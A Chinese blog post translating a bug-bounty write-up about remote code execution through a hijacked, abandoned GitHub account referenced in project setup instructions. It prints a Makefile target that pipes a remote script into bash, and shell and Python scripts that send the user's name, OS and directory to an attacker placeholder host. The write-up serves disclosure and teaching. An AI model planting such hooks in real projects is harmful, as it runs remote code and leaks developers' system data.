#  RCE   
 迪哥讲事   2025-05-07 14:58  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/4236  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnkJopjTAeBLic5ZZn74HdicSyGpgfgCtgT2OicibkyvyWYvSwMs8EorRSw2oJMoW0CfxkW48Go575ypg/640?wx_fmt=png&from=appmsg "")  
  
file  
# 前言  
  
今天分享国外白帽小哥在 H1 的一个私有项目上发现 RCE 漏洞的故事，出于隐私原因，文中实际目标程序统一由“redacted”代替。  
# 攻击方式  
  
该漏洞源于在多个项目中持续使用无人认领的 GitHub 帐户。  
## 寻找易受攻击的存储库：  
- github.com/redacted-developer/redacted-search  
  
- github.com/redacted-developer/LLM-something  
  
- 其它项目等  
  
## 利用废弃的 GitHub 帐户  
  
一个关键发现是多个仓库指示用户从未声明的 GitHub 帐户克隆依赖项，例如：  
```
git clone https://github.com/Unclaimed-github-account/redacted-something-search.gitcd redacted-something-search/cp .env.template .envmake deploy
```  
  
由于 Unclaimed-github-account 已被废弃，因此我们能够将其注册到自己的控制之下。  
  
一旦获得了仓库的所有权，攻击者就可以将恶意代码 （ Makefile 和 poc.sh ）上传到开发人员构建和部署过程中克隆的存储库中。  
```
deploy: curl https://raw.githubusercontent.com/Unclaimed-github-account/redacted-something-search/refs/heads/main/poc.sh | bash
```  
  
恶意 poc.sh：  
```
#!/bin/bashusername=$(whoami)os_details=$(uname -a)current_directory=$(pwd)data="username=$username&os_details=$os_details&current_directory=$current_directory"curl -X POST -d "$data" https://<attacker_server>
```  
  
make deploy  
 会命令触发了 Makefile  
 ，下载并执行恶意 poc.sh 脚本，从而导致在受害者的机器上执行远程代码。  
## LLM-something 存储库中的相同问题  
  
同样在 LLM-something 存储库中，用户被指示安装依赖项并运行应用程序：  
```
pip install -r requirements.txtstreamlit run run.py
```  
  
通过修改 run.py 文件来‘悄悄’收集敏感信息，例如：  
- 用户名  
  
- 操作系统详细信息  
  
- 当前工作目录  
  
- IP 地址  
  
恶意 run.py 的代码片段：  
```
import osimport platformimport requestsimport streamlit as stusername = os.getlogin()current_directory = os.getcwd()os_info = platform.system() + " " + platform.release()server_url = "https://<attacker-server>/log"data = {"username": username,"directory": current_directory,"os": os_info}try: response = requests.post(server_url, data=data) st.success(f"Info sent to server! Response: {response.status_code}")except Exception as e: st.error(f"Error sending data: {e}")st.title("System Info Sender")st.write("User info has been sent automatically when you started this app.")
```  
# 漏洞时间线  
- Day0： 发现、利用并向厂商提交报告  
  
- Day7：报告分类，严重程度从 “严重” 降级为 “高” （原因是需要用户交互）  
  
- Day7：获得赏金 2500 美元奖励  
  
- Day23：Unclaimed-github-account 的所有权转回厂商  
  
- Day25：漏洞修复  
  
希望本故事对你有所启发。  
  
  
如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg "")  
  
  
往期回顾  
# 如何绕过签名校验  
#   
  
[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)  
  
  
[挖掘有回显ssrf的隐藏payload](https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496898&idx=1&sn=b6088e20a8b4fc9fbd887b900d8c5247&scene=21#wechat_redirect)  
  
  
[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)  
  
  
[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
[‍](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
  
  
原文：https://infosecwriteups.com/the-2500-bug-remote-code-execution-via-supply-chain-attack-3beb07ac1a4c  
  
  
